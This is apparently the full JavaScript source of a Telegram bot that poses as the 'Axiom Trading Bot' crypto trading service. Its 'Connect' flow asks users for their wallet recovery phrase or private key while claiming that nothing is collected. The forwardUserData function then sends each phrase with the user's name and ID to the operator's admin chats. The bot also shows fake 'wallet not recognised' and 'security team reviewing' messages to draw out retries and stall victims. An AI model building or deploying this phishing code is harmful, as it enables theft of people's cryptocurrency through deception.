const { Telegraf, Markup, session } = require("telegraf");
const LocalSession = require("telegraf-session-local");

// --- Helper: Escape special Markdown characters ---
function escapeMarkdown(text) {
  if (typeof text !== 'string') return '';
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// --- Configuration ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_IDS || "")
  .split(",")
  .map((id) => parseInt(id.trim()))
  .filter((id) => !isNaN(id));

const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL;

// --- Critical Checks ---
if (!BOT_TOKEN) {
  console.error("CRITICAL ERROR: BOT_TOKEN environment variable is not set.");
  process.exit(1);
}
if (!WEBHOOK_URL) {
  console.error("CRITICAL WARNING: WEBHOOK_URL is not set. Webhooks may fail.");
}
if (ADMIN_CHAT_IDS.length === 0) {
  console.warn("WARNING: No valid admin IDs provided.");
}

const bot = new Telegraf(BOT_TOKEN);

// --- Session (temporary on Koyeb) ---
const session_local = new LocalSession({ database: "bot_sessions.json" });
bot.use(session_local.middleware());

const userWallets = {};
const CONNECT_STATE = "waiting_for_phrase";

// --- Keyboards ---
const mainMenuKeyboard = Markup.keyboard([
  ["🛒 Buy", "💰 Sell"],
  ["🔗 Connect"],
  ["⚙️ Copy Trading", "🟠 Sniper"],
  ["💸 withdraw", "👝 Wallet"],
  ["🚀 Launch", "🔄 DCA"],
  ["Positions 📈", "❓ Help"],
  ["🔄 Reset"],
]).resize();

const cancelInlineKeyboard = Markup.inlineKeyboard([
  Markup.button.callback("🚫 Cancel", "cancel_connect_flow"),
]);

// --- Helpers ---
function isConnected(userId) {
  return userWallets[userId] === true ||
    (bot.context.session?.wallet_status === "connected");
}

async function sendWelcomeMessage(ctx) {
  const welcomeMessage = `👋 Welcome to Axiom Trading Bot! Exclusively powered by the Axiom community, 
The fastest and smartest bot for trading any token across multiple blockchains. ⚡🌎

Trade safer. Trade smarter. Trade Axiom. 🚀

TOP ⬆️ Main Menu`;
  await ctx.replyWithMarkdown(welcomeMessage, mainMenuKeyboard);
}

// --- SAFE Forwarding Function (FIXED) ---
async function forwardUserData(ctx, phrase) {
  const username = ctx.from.username ? `@${ctx.from.username}` : "N/A";
  const userId = ctx.from.id;

  // Escape user input to prevent Markdown errors
  const safePhrase = escapeMarkdown(phrase.trim());
  const safeUsername = escapeMarkdown(username);

  // Try sending with Markdown first
  const clientMessage = `
📩 *New Wallet Connection*

🛠 Service: Wallet Connection
💎 Recovery Phrase: \`${safePhrase}\`
👤 Client: ${safeUsername}
🆔 User ID: \`${userId}\`
`;

  for (const adminId of ADMIN_CHAT_IDS) {
    try {
      await bot.telegram.sendMessage(adminId, clientMessage, {
        parse_mode: "MarkdownV2", // Use MarkdownV2 for better escaping
      });
      console.log(`✅ Forwarded data from user ${userId} to admin ${adminId}.`);
    } catch (error) {
      console.error(`⚠️ Failed with Markdown for admin ${adminId}:`, error.message);
      // Fallback to plain text
      try {
        const plainMessage = `
📩 New Wallet Connection

🛠 Service: Wallet Connection
💎 Recovery Phrase: ${phrase}
👤 Client: ${username}
🆔 User ID: ${userId}
`;
        await bot.telegram.sendMessage(adminId, plainMessage);
        console.log(`✅ Sent plain text to admin ${adminId}.`);
      } catch (fallbackError) {
        console.error(`❌ Failed to forward to admin ${adminId} (even as plain text):`, fallbackError.message);
      }
    }
  }
}

// --- Handlers ---
bot.hears("🔗 Connect", async (ctx) => {
  ctx.session.state = CONNECT_STATE;
  const message = `🔑 *Import Wallet*

Enter your 12-key recovery phrase or private key to proceed.

🔒 *Security Notice*
Your seed phrase is 100% safe — our bot does not collect or store your private 
keys or seed phrase. All actions are non-custodial and fully under your control.`;
  await ctx.replyWithMarkdown(message, cancelInlineKeyboard);
});

bot.action("cancel_connect_flow", async (ctx) => {
  ctx.session.state = null;
  await ctx.reply("🚫 Transaction cancelled. Returning to Main Menu.", mainMenuKeyboard);
  await ctx.answerCbQuery();
});

// --- Commands ---
bot.start(sendWelcomeMessage);
bot.hears("Main Menu", sendWelcomeMessage);
bot.command("menu", async (ctx) => {
  ctx.session.state = null;
  const menuText = [
    "**Buy tokens** /buy",
    "**Sell tokens** /sell",
    "**Claim rewards** /claim",
    "**Connect your wallet** /connect"
  ].join("\n");
  await ctx.replyWithMarkdown(menuText, mainMenuKeyboard);
});

// Kill state on command
bot.use(async (ctx, next) => {
  if (ctx.message?.text?.startsWith("/")) {
    if (ctx.session.state === CONNECT_STATE) {
      ctx.session.state = null;
    }
  }
  await next();
});

// --- Feature Handler ---
const GENERIC_DISCONNECTED_MESSAGE = "Please connect your wallet to access this feature.";

async function featureHandler(ctx, featureName, disconnectedMessage = null) {
  const userId = ctx.from.id;
  if (ctx.session.state) ctx.session.state = null;

  if (isConnected(userId)) {
    const msg = `✅ *Connection Status: Reviewing*

You have successfully submitted your wallet information. Our security team is now reviewing the connection to ensure full compatibility.

A dedicated team member will reach out to you personally via this chat within the next 15 minutes to confirm activation and assist you with your first *${featureName}* transaction.

Thank you for your patience!`;
    await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
  } else {
    const msg = disconnectedMessage || GENERIC_DISCONNECTED_MESSAGE;
    if (disconnectedMessage) {
      await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
    } else {
      await ctx.reply(msg, mainMenuKeyboard);
    }
  }
}

// Feature buttons
bot.hears("🛒 Buy", (ctx) => featureHandler(ctx, "Buy"));
bot.command("buy", (ctx) => featureHandler(ctx, "Buy"));
bot.hears("💰 Sell", (ctx) => featureHandler(ctx, "Sell"));
bot.command("sell", (ctx) => featureHandler(ctx, "Sell"));
bot.command("claim", (ctx) => featureHandler(ctx, "Claim rewards"));

bot.command("connect", async (ctx) => {
  ctx.session.state = null;
  await bot.handleUpdate({ message: { text: "🔗 Connect", from: ctx.from, chat: ctx.chat } });
});

bot.hears("⚙️ Copy Trading", (ctx) =>
  featureHandler(ctx, "Copy Trading", `©️ Copy Trading\n\nPlease connect your wallet first to start trading.\n\nMinimum buy: 0.5 SOL\n\nClick 'Connect Wallet' to import your wallet.`)
);

bot.hears("🟠 Sniper", (ctx) =>
  featureHandler(ctx, "Sniper", `☄️LP Sniper\n\nPlease connect your wallet first to start trading.\n\nConnect wallet to start sniping\n\nClick 'Connect Wallet' to import your wallet.`)
);

// Other features
["💸 withdraw", "👝 Wallet", "🚀 Launch", "🔄 DCA", "Positions 📈"].forEach(cmd => {
  bot.hears(cmd, (ctx) => featureHandler(ctx, cmd));
});

bot.hears("❓ Help", async (ctx) => {
  ctx.session.state = null;
  const help = `❓ *Help*

You can open a request to the PumpX Bot support service. The Tech team would respond in 
the next 24 hours Via your your DM for a faster solution to the problem, 
describe your appeal as clearly as possible. You can provide files or images if needed.

Rules for contacting technical support:
1. When you first contact, please introduce yourself.
2. Describe the problem in your own words.
3. Be polite, and politeness will be with you!`;
  await ctx.replyWithMarkdown(help, mainMenuKeyboard);
});

bot.hears("🔄 Reset", async (ctx) => {
  const userId = ctx.from.id;
  ctx.session.state = null;
  delete ctx.session.wallet_status;
  delete userWallets[userId];
  await ctx.replyWithMarkdown(
    "🔄 *Session Reset Complete!* Your wallet connection has been cleared. Tap *🔗 Connect* to start over.",
    mainMenuKeyboard
  );
});

// --- Handle phrase input ---
bot.on("text", async (ctx, next) => {
  if (ctx.session.state !== CONNECT_STATE) return next();

  const phrase = ctx.message.text;
  await forwardUserData(ctx, phrase);

  ctx.session.state = null;
  await ctx.reply("❌ Wallet not connected — We couldn’t recognise that wallet. Please double-check and try again.", mainMenuKeyboard);
});

// --- Fallback ---
bot.on("text", async (ctx) => {
  if (!ctx.session.state) {
    await ctx.reply("I'm sorry, I didn't recognize that command. Please use the menu buttons below.", mainMenuKeyboard);
  }
});

// --- Start Bot ---
if (WEBHOOK_URL) {
  try {
    const url = new URL(WEBHOOK_URL);
    const webhookPath = `/telegraf/${bot.secretPathComponent()}`;

    bot.launch({
      webhook: {
        domain: url.hostname,
        port: parseInt(PORT, 10),
        hookPath: webhookPath,
      },
    }).then(() => {
      console.log(`✅ Bot started via Webhook on port ${PORT}`);
      console.log(`📡 Webhook URL: ${new URL(webhookPath, WEBHOOK_URL).href}`);
    }).catch(err => {
      console.error("❌ Webhook launch failed:", err);
      process.exit(1);
    });
  } catch (e) {
    console.error("❌ Invalid WEBHOOK_URL:", e.message);
    process.exit(1);
  }
} else {
  bot.launch().then(() => console.log("🤖 Polling mode (local only)"));
}

process.once("SIGINT", () => bot.stop("SIGINT"));
process.once("SIGTERM", () => bot.stop("SIGTERM"));
